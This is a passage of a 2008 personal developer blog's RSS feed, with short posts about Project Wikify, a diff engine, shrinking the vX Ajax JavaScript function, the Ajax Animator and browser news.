      <pubDate>Sat, 20 Dec 2008 00:45:10 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/wikify-format-2-0/</guid>
      <author></author>
      <description>&lt;p&gt;2.0 isn’t an actual version number, but i’ve added the new one.&lt;/p&gt;
&lt;p&gt;it’s basically&lt;/p&gt;
&lt;p&gt;Parent ID (or _body) &amp;gt; Element tag name : Parent Index &amp;gt; format type = patch/innerhtml data&lt;/p&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;p&gt;_body&amp;gt;div:0&amp;gt;span:1&amp;gt;d=hello!&lt;/p&gt;
&lt;p&gt;the formats are p, d, and o, or Patch, HTML, and Legacy, respectively. Patch uses &lt;a href=&quot;http://code.google.com/p/google-diff-match-patch/&quot;&gt;diff-match-patch&lt;/a&gt;, unidiff style data. Patch is the same, and Legacy is an intermediate format of sorts, which is easily converted to from the old formats, but still follows the general pattern of location&amp;gt;type=data. The only difference between Legacy and HTML is that legacy uses a different location scheme.&lt;/p&gt;
&lt;p&gt;The pluses of this new system, is that it’s more accurate, and your edits are more resistant to page changes. The data is more human readable, the system is more reliable, and stores less data on the server. The cons, are that there is a 20kb overhead in wikify core, and saving may take some more time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Crashing IE</title>
      <link>http://antimatter15.com/2008/12/crashing-ie/</link>
      <pubDate>Fri, 19 Dec 2008 23:39:22 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/crashing-ie/</guid>
      <author></author>
      <description>&lt;p&gt;Well, I was trying to iron out a IE bug for project wikify. Interestingly, that bug I encountered, crashes every IE since 5.5 (not sure if it crashes  5.0 yet, browsershots are still loading)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://wikify.googlecode.com/svn/trunk/v2/crashie.htm&quot;&gt;http://wikify.googlecode.com/svn/trunk/v2/crashie.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;really, this just is just &lt;em&gt;another&lt;/em&gt; IE issue….&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wikify Diff Engine</title>
      <link>http://antimatter15.com/2008/12/wikify-diff-engine/</link>
      <pubDate>Thu, 18 Dec 2008 05:40:31 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/wikify-diff-engine/</guid>
      <author></author>
      <description>&lt;p&gt;So i built a pretty crappy tree-diff system for Wikify. It completely ignores the creation of new nodes, or the deletion of the nodes, but it works most of the time. It’s tree based, so the data is fine-grained to the level of however small the nodes are made to be. But many pages with huge paragraphs or such, have huge nodes, and editing a single word would mean saving a huge amount of data.&lt;/p&gt;
&lt;p&gt;So Wikify will now use both the tree-based diff (which is great for HTML/XML docs, as they are trees) and divide the changes into text and do text diff for that. Right now, the only thing sutable is the google-diff-match-patch project, which is absolutely amazing, except for how huge it is. But I figure its okay, because I’m already including the (relative) bloatness of jQuery… (especially compared to vX)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>EtherPad</title>
      <link>http://antimatter15.com/2008/12/etherpad/</link>
      <pubDate>Wed, 17 Dec 2008 05:42:58 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/etherpad/</guid>
      <author></author>
      <description>&lt;p&gt;I just got accepted into beta for it, and it’s insanely great! There are some disconnect issues, but the latency is awesome, etc. If only syntax hightlighting was better.&lt;/p&gt;
&lt;p&gt;And yes, i’m killing their servers by contributing to their &lt;a href=&quot;http://etherpad.com/ep/blog/posts/etherpad-temporarily-reverts-to-closed-beta&quot;&gt;viral&lt;/a&gt; growth :P&lt;/p&gt;
&lt;p&gt;as a sidenote, i’m actually hyperlinking my links! (freaky, I know), and my posts are getting less and less mature over the months/years&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Porting Ajax Animator to Titanium</title>
      <link>http://antimatter15.com/2008/12/porting-ajax-animator-to-titanium/</link>
      <pubDate>Wed, 17 Dec 2008 02:27:04 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/porting-ajax-animator-to-titanium/</guid>
      <author></author>
      <description>&lt;p&gt;So the issue with Adobe AIR, is that there’s no SVG support, but I have a hunch that &lt;a href=&quot;http://titaniumapp.com/&quot;&gt;this&lt;/a&gt; might support SVG, as it’s not Adobe’s fork of Webkit, but hopefully the &lt;em&gt;real&lt;/em&gt; one :)&lt;/p&gt;
&lt;p&gt;It has tons of awesome components like WebKit, Chromium (hope it doesn’t have that rotate bug…), Gears, GTK+, jQuery, Appcelerator SDK, NSIS, Ruby.&lt;/p&gt;
&lt;p&gt;But this will hopefully satisfy those wishes for a Desktop version.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>WordPress 2.7!</title>
      <link>http://antimatter15.com/2008/12/wordpress-2-7/</link>
      <pubDate>Thu, 11 Dec 2008 21:58:22 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/wordpress-2-7/</guid>
      <author></author>
      <description>&lt;p&gt;updating! it looks insanely great.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Posting From WP 2.7</title>
      <link>http://antimatter15.com/2008/12/posting-from-wp-2-7/</link>
      <pubDate>Thu, 11 Dec 2008 03:17:00 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/posting-from-wp-2-7/</guid>
      <author></author>
      <description>&lt;p&gt;I’m posting this from the entire awesomeness which is Wordpress 2.7!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>vX Ajax is almost 10 bytes smaller</title>
      <link>http://antimatter15.com/2008/12/vx-ajax-is-almost-10-bytes-smaller/</link>
      <pubDate>Thu, 04 Dec 2008 01:15:06 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/vx-ajax-is-almost-10-bytes-smaller/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, so 0 = false, so it makes sense that !0 = true. but also 1 = true, so that saved 1 byte.&lt;/p&gt;
&lt;p&gt;Since there’s no .readyState attribute &amp;gt; 4, instead of .readyState == 4, you can do .readyState&amp;gt;3&lt;/p&gt;
&lt;p&gt;the big one was ActiveX, which was originally&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;x=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.ActiveXObject?ActiveXObject:XMLHttpRequest)(&lt;span class=&quot;hljs-string&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I noticed how this.activeXObject was repeated unnecessarily. So i added a new variable y&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;y=&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.ActiveXObject
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;then I did:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;y=&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.ActiveXObject;x=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;(y?y:XMLHttpRequest)(&lt;span class=&quot;hljs-string&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;thanks to dynamic languages, I could use x, and just reset it to something else (saving a variable declaration!)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;x=&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.ActiveXObject;x=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;(x?x:XMLHttpRequest)(&lt;span class=&quot;hljs-string&quot;&gt;'Microsoft.XMLHTTP'&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now I just need to find a way to shrink &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;x.setRequestHeader(&lt;span class=&quot;hljs-attribute&quot;&gt;'Content&lt;/span&gt;-&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt;',&lt;span class=&quot;hljs-attribute&quot;&gt;'application&lt;/span&gt;/x-www-form-urlencoded')
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Wikify Update</title>
      <link>http://antimatter15.com/2008/12/wikify-update/</link>
      <pubDate>Thu, 04 Dec 2008 01:07:36 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/12/wikify-update/</guid>
      <author></author>
      <description>&lt;p&gt;I updated Wikify with the new Toolbar UI.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://wikify.antimatter15.com/&quot;&gt;http://wikify.antimatter15.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>3000th spam</title>
      <link>http://antimatter15.com/2008/11/3000th-spam/</link>
      <pubDate>Tue, 18 Nov 2008 07:34:36 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/11/3000th-spam/</guid>
      <author></author>
      <description>&lt;p&gt;Yay! this blog just had it’s 3,000th spam comment!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Dojo?</title>
      <link>http://antimatter15.com/2008/10/dojo/</link>
      <pubDate>Fri, 31 Oct 2008 21:18:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/dojo/</guid>
      <author></author>
      <description>&lt;p&gt;IE support is something really important to most users. especially with around 80% of the world still using it.&lt;/p&gt;
&lt;p&gt;Raphael doesn’t seem that good, much worse than OnlyPaths SVG Renderer. But something that seems better is still Dojo.GFX&lt;/p&gt;
&lt;p&gt;It supports Circles, Ellipses, Groups, Images, Lines, Draggable things, Paths, Points, Polylines, Rectangles, Text, Fonts, etc. and renders into VML, SVG and Silverlight.&lt;/p&gt;
&lt;p&gt;It’s size isn’t too big either and there are CDNs for it. We could also learn from xDraw to design our editor.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Thoughts</title>
      <link>http://antimatter15.com/2008/10/ajax-animator-thoughts/</link>
      <pubDate>Sat, 25 Oct 2008 07:10:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/ajax-animator-thoughts/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve set some tiny goals for Ajax Animator 0.21/0.22/0.23/0.24/0.25. I’m not really good with version numbers.&lt;/p&gt;
&lt;p&gt;0.21 is mostly to work on the collaborative, online, web 2.0 aspect of it. Enabling collaboration is important, and I’m a huge supporter of User Created content (virtually all my projects are open source, and they include some entirely user-created things like my MMORPG, Project Wikify, and a few others). At one point, since the old ajax animator (not anymore) would keep logs of everything previewed (as we needed to convert it to flash to preview). I would enjoy people trying out how things were like. That was in the day where there were to tools: rectangles and sticks, and the lines didn’t tween well. Color picking was unnecessarily complicated, the tweening engine crashed every minute, and couldn’t do anything, etc. Since the 0.2 rewrite, things are much better, but I still miss having those user-management features.&lt;/p&gt;
&lt;p&gt;If you didn’t know that, User Management/Sharing has been in the ajax animator for a while. It was frequently added, removed, mutilated, upgraded, etc. I think it was there since the DHTML Goodies days (0.08?). It got removed for a while, got added again, removed, rewritten, and now removed again. I look forward to adding it again.&lt;/p&gt;
&lt;p&gt;I guess much of it is already there. The login should look pretty much the same as the old one, but with the whole login thing replaced with a single OpenID box and a login button. I’m not exactly sure what to do after this. I think there should be a little profile box that replaces the login panel. I’m debating whether the profile should house a list of your saved animations, or if it should be nested into that Animation browser (that actually works!). I’m leaning towards the latter. The profile may house a link to your folder in the animation directory, a button to save your edits (as with File-&amp;gt;Save-&amp;gt;Webserver). Etc.&lt;/p&gt;
&lt;p&gt;With that, it would include some form of user management system. I’ve almost completely settled on OpenID because of it’s flexibility, futuristicity, freaking-awesomeness (getting a bit overboard…). I’ve just been surfing the web (Wikipedia stuff) and I’m increasingly interested in OpenID, as it seems much more “ajax-friendly” than I previously thought.&lt;/p&gt;
&lt;p&gt;Some time, i’d like to switch to a more scalable app-engine oriented system (it’s already serving up static JS now). I’ll use my server at antimatter15.com more (Java-Enabled), so there can finally be decent flash export :)&lt;/p&gt;
&lt;p&gt;One thing that i’d really like, that’s really probably painful, is to better support IE. There’s no problem with IE support in the general components of the Ajax Animator (Tweening/UI/Save/Format/Abstraction Layer/etc), but rendering isn’t very good. I’d like for it to be better. OnlyPaths is already great, but IE support is big for it to become mainstream. I’d like it for use in a more educational and amature(ish) setting, where people have the most use for free/opensource/easy-to-run apps. In education, many people are still using IE, and that’s a big problem.&lt;/p&gt;
&lt;p&gt;I’ve been looking into other renderers for the future of the Ajax Animator to run on. For the forseeable future, the editor will be OnlyPaths, because it is the only one that really fits the needs of the project. But it’s built on a less-clean, prototype-like (non-namespaced) foundation, and isn’t built exactly as it should. It’s not up to me, but I think that OnlyPaths should be an editor, rather than a renderer, or at least the renderer and the editor to have very visible lines between. Right now, much of the editor interface is in the renderer. That means a lot of unnecesary work. The addTracker function is currently in the renderer, this is completely the wrong thing. It was fine in the days when it was Richdraw and the tracker was just a blue square, but that’s not scalable. On this trend, you would need 2 copies of essentially the same code (VML/SVG) for the tracker/etc. I’d much prefer to have a interactive-less renderer and addTracker function in the editor, where all the actions are calls to the drawing API. Either Onlypaths has to get a better VML renderer, or we have to switch rendering engines to something like Dojo.GFX or Raphael and port the editor over to the new renderers. I like the current OnlyPaths one a lot. It’s been developed side-by-side with the Ajax Animator, and is very well integrated. I dont like Dojo.GFX too much, because it’s dojo-dependencies, but it’s a very solid and stable framework. And Raphael isn’t as powerful as the current OnlyPaths engine yet.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Deja Vu</title>
      <link>http://antimatter15.com/2008/10/deja-vu/</link>
      <pubDate>Mon, 20 Oct 2008 03:38:32 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/deja-vu/</guid>
      <author></author>
      <description>&lt;p&gt;Um… I got vX Ajax 1 byte smaller.&lt;/p&gt;
&lt;p&gt;*I think you can’t get any smaller than this… For real…&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Can Anyone Beat This?</title>
      <link>http://antimatter15.com/2008/10/can-anyone-beat-this/</link>
      <pubDate>Tue, 14 Oct 2008 00:57:11 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/can-anyone-beat-this/</guid>
      <author></author>
      <description>&lt;p&gt;The original vX function was 337b. Now, it’s been reduced down to 293 bytes, while adding a new feature (callback is now optional).&lt;/p&gt;
&lt;tt&gt;
X=function(u,f,p,x){x=window.ActiveXObject?new ActiveXObject(‘Microsoft.XMLHTTP’):new XMLHttpRequest();x.open(p?’POST’:’GET’,u,!0);p?x.setRequestHeader(‘Content-type’,’application/x-www-form-urlencoded’):p;x.onreadystatechange=function(){x.readyState==4?f?f(x.responseText,x):f:0};x.send(p)}&lt;/tt&gt;

&lt;p&gt;Apparently, the above stuff doesn’t work (Wordpress?)&lt;/p&gt;
&lt;p&gt;It’s really quite amazing. The big things that reduced size were using lots of condititional things, really obfuscated unreadable stuff, and using !0 instead of true, and !1 instead of false.&lt;/p&gt;
&lt;p&gt;If you want to use it, try building your own copy from.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://vxjs.googlecode.com/svn/trunk/build.htm&quot;&gt;http://vxjs.googlecode.com/svn/trunk/build.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The usage has signifigantly changed though, there, everything’s namespaced under an underscore, so it’s _.X(“url”)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>vX JS Library</title>
      <link>http://antimatter15.com/2008/10/vx-js-library/</link>
      <pubDate>Sun, 12 Oct 2008 02:22:22 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/vx-js-library/</guid>
      <author></author>
      <description>&lt;p&gt;Built on top of the vX Ajax Function, is the vX JS Library. It’s probably the world’s smallest JS Library, in total, about 1.45kb, with things like Animations, Ajax, JSON Serialization, URL Encoding, Cloning, Event Handling, Fade Effects, and more. It’s signifigantly less elegant than jQuery and others, but it is extremely lightweight and quite cross-platform. The code has been optimized down to each individual byte.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://code.google.com/p/vxjs/&quot;&gt;http://code.google.com/p/vxjs/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It’s not too useful. It may be useful for some tiny things, but it’s not really that useful.&lt;/p&gt;
&lt;p&gt;It’s not good enough to make things really high-quality, or complex such as the Ajax Animator. It’s good only if your making like something small, where you might want some ajax, but still want it to load fast.&lt;/p&gt;
&lt;p&gt;Also, another thing, not exactly part of the library is vXg, a Get-Only version of vX that’s only 221 bytes.
&lt;a href=&quot;http://vxjs.googlecode.com/svn-history/r26/trunk/ajaxget.js&quot;&gt;http://vxjs.googlecode.com/svn-history/r26/trunk/ajaxget.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;vXg(URL, CALLBACK)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>vX Ajax Function</title>
      <link>http://antimatter15.com/2008/10/vx-ajax-function/</link>
      <pubDate>Tue, 07 Oct 2008 05:01:03 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/10/vx-ajax-function/</guid>
      <author></author>
      <description>&lt;p&gt;For one of my projects, I needed a really simple, lightweight one. It’s super lightweight. I mean really. really lightweight. Only 337 bytes (though 1 kilobyte of random crap in front of it would make it 1337 bytes). Most libraries are over 60kb! If you’re using it &lt;em&gt;only&lt;/em&gt; for ajax. You’re using 180 TIMES what you really need.&lt;/p&gt;
&lt;p&gt;This one can do GET/POST requests with a callback&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;/*vX Ajax Function. (C) Antimatter15 2008*/&lt;/span&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;vX&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(u,f,p)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; x=(&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.ActiveXObject)?&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ActiveXObject(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Microsoft.XMLHTTP&quot;&lt;/span&gt;):&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();
x.open(p?&lt;span class=&quot;hljs-string&quot;&gt;&quot;POST&quot;&lt;/span&gt;:&lt;span class=&quot;hljs-string&quot;&gt;&quot;GET&quot;&lt;/span&gt;,u,&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(p) x.setRequestHeader(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-type&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;);
x.onreadystatechange=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(x.readyState==&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;&amp;amp;amp;&amp;amp;amp;x.status==&lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt;) f(x.responseText)};x.send(p)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It takes 3 parameters. the URL, the Callback function, and the post parameters (optional).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='cmake'&gt;&lt;/span&gt;vX(AJAX URL, CALLBACK &lt;span class=&quot;hljs-keyword&quot;&gt;FUNCTION&lt;/span&gt;[, POST PARAMETERS]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that here the callback is required, not optional, though it could probably be made to do that by changing f?f(x.responseText):x.&lt;/p&gt;
&lt;p&gt;To Use:&lt;/p&gt;
&lt;p&gt;GET:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='haxe'&gt;&lt;/span&gt;vX(&lt;span class=&quot;hljs-string&quot;&gt;&quot;ajax.php?you=suck&amp;amp;amp;howmuch=alot&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(responsetext)&lt;/span&gt;&lt;/span&gt;{alert(responsetext)})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;POST:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='haxe'&gt;&lt;/span&gt;vX(&lt;span class=&quot;hljs-string&quot;&gt;&quot;ajax.php&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(responsetext)&lt;/span&gt;&lt;/span&gt;{alert(responsetext)}, &lt;span class=&quot;hljs-string&quot;&gt;&quot;you=suck&amp;amp;amp;howmuch=alot&quot;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That’s it. In case your wondering what the name is, I wanted somethign that was short so it was lightweight. I didnt want it to be single letter because single-letter names are likely to collide with other libraries. Also because “V” and “X” are two widely overused characters anyway. Another reason might be that you dont know what version it is :P&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Wikify Prototype 5 Released</title>
      <link>http://antimatter15.com/2008/09/project-wikify-prototype-5-released/</link>
      <pubDate>Thu, 18 Sep 2008 00:27:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/project-wikify-prototype-5-released/</guid>
      <author></author>
      <description>&lt;p&gt;I just released Project Wikify prototype 5 revision 9. The highlights are support for ‘Channels” which let you have your own private “fork” of the internet. Also, Full IE support, and a completely redesigned website. On the backend, there’s a new communication protocol. Saving is only done through POST, no more JSONP/GET stuff. Loading is done differently too.&lt;/p&gt;
&lt;p&gt;Again, you can get it from &lt;a href=&quot;http://wikify.antimatter15.com&quot;&gt;http://wikify.antimatter15.com &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;As with all the major updates before, the database was trashed in the process.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Wikify Success</title>
      <link>http://antimatter15.com/2008/09/project-wikify-success/</link>
      <pubDate>Tue, 09 Sep 2008 04:12:47 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/project-wikify-success/</guid>
      <author></author>
      <description>&lt;p&gt;Project Wikify is working out really well. My blog is getting vandalized a lot, and I actually find it really funny.&lt;/p&gt;
&lt;p&gt;So, thanks spammers! You’ve just made my day (seriously). And posting this probably constitutes a change in the template, and will screw up Project Wikify.&lt;/p&gt;
&lt;p&gt;For all of you who don’t have either Project Wikify, RWK, or the Project Wikify GreaseMonkey Userscript, follow the nex link to view the vandalized page (it’s the RWK version, not the full Wikify one, so you can’t edit it on that.).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;[View my super-vandalized blog]

javascript:(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt;%&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;A=&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;hljs-string&quot;&gt;&quot;script&quot;&lt;/span&gt;);A.src=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://wikify.antimatter15.com/server/rwk?url=&quot;&lt;/span&gt;+&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.location.href;&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.getElementsByTagName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;head&quot;&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].appendChild(A)})()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;[Edit]
Amazingly, it turns out Wordpress assigns IDs to posts, so it actually works (cool)! which is far better than I expected. So, it really shows how this project is working out way better than I imagined. and I’m sure someone is gonna edit this.&lt;/p&gt;
&lt;p&gt;[Edit v0.2 Pre Alpha Beta Prototype 3 revision 1 Stable (Development) Testing Build 44 ASCII codename: copying the ajax animator’s insanely long version names]
For all of you who haven’t tried this magical program yet, try so here at &lt;a href=&quot;http://wikify.antimatter15.com/&quot;&gt;wikify dot antimatter15 dot com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[Edit Again]&lt;/p&gt;
&lt;p&gt;Okay, I was wrong, it did screw up the template :( Wikify is messed up now :(&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Wikify Prototype 4 Revision 3</title>
      <link>http://antimatter15.com/2008/09/project-wikify-prototype-4-revision-3/</link>
      <pubDate>Mon, 08 Sep 2008 00:58:27 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/project-wikify-prototype-4-revision-3/</guid>
      <author></author>
      <description>&lt;p&gt;new version fixes some DB issues. probably actually ready for most use.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Spam...</title>
      <link>http://antimatter15.com/2008/09/spam/</link>
      <pubDate>Sun, 07 Sep 2008 06:50:55 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/spam/</guid>
      <author></author>
      <description>&lt;p&gt;I’m getting a lot of spam (it’s showing up on my Akismet filter) on this blog now. I usually only get a few (~5) trackback spams (no comment spam). But now, I’m getting ~11 trackback messages OVERNIGHT, and I’m getting a few comment spams (basically unheardof). Just like two weeks ago I hit a TOTAL of 500 spam, now it’s close to 1200.&lt;/p&gt;
&lt;p&gt;Strangely enough, I’m actually pretty happy of this. Spam is an indication of people actually visiting it. Even though virtually nobody comments (still a lot more than the early days of the blog).&lt;/p&gt;
&lt;p&gt;And the stuff at &lt;a href=&quot;http://antimatter15.110mb.com/phpfusion/&quot;&gt;http://antimatter15.110mb.com/phpfusion/&lt;/a&gt; is really spammy now :( I built a quick-n-dirty spam filter for it, and it’s database is over 7mb !!!!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Chrome</title>
      <link>http://antimatter15.com/2008/09/google-chrome/</link>
      <pubDate>Mon, 01 Sep 2008 23:33:20 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/google-chrome/</guid>
      <author></author>
      <description>&lt;p&gt;It’s awesome btw. The tab bar location is like opera, the new tab button is like IE, the password manager is like firefox, and buttons are like IE 8. I’m actually posting from IE 8, and it (being based on Webkit) works with the Ajax Animator.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Wikify</title>
      <link>http://antimatter15.com/2008/09/project-wikify/</link>
      <pubDate>Mon, 01 Sep 2008 04:01:20 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/09/project-wikify/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://wikify.antimatter15.com/&quot;&gt;http://wikify.antimatter15.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wikifying the Internet</title>
      <link>http://antimatter15.com/2008/08/wikifying-the-internet/</link>
      <pubDate>Thu, 28  Aug 2008 21:24:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/wikifying-the-internet/</guid>
      <author></author>
      <description>&lt;p&gt;What if you could edit a copy of any site in the entire web, and have it persist? Well, I’m working on a bookmarklet that basically does the classic (javascript:(function(){document.designMode=”on”})()) but with persistance. It’s going to store all changes to the web page on a centralized patch server (app engine?) and anyone who clicks on the bookmarklet will be instantly be able to see previous edits and make their own.&lt;/p&gt;
&lt;p&gt;So, what could it be used for? Well, you could use it to fix small typos on the internet, Update far-outdated pages/info, and let’s not forget, vandalize the home page of your arch nemisis. But as a wiki, everything can be reverted/etc. The design for the system is very nice, as it only stores the content modified by users, one way of averting legal action against me (i’ll also be sure to add disclaimers too :)).&lt;/p&gt;
&lt;p&gt;Of course the vandalism part will probably be what happens, as with most Wikis (besides the mother-of-all Wikis). it’s still an interesting concept anyway. Maybe it’ll make people happier, when every time they view their (usually empty) adsense page and always find it saying $100,000.00 for their day’s earnings? And it’s not forced on anyone, and if it becomes open-source (it’s easily implementable anyway), the bookmarklets could be customized on custom servers, creating an endless amount of forks of the internet.&lt;/p&gt;
&lt;p&gt;I only have a non-working prototype so far, i’m going to embark on a rewrite soon.  And thanks to the App Engine team for raising the limit to the number of apps-per-dev.&lt;/p&gt;
&lt;p&gt;As you know, I’m sorta taking a break from the Ajax Animator. It’s sometimes nicer to work on some smaller projects now and then.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Controlling A Native App from a Javascript Desktop</title>
      <link>http://antimatter15.com/2008/08/controlling-a-native-app-from-a-javascript-desktop/</link>
      <pubDate>Thu, 28  Aug 2008 21:13:37 -0400</pubDate>
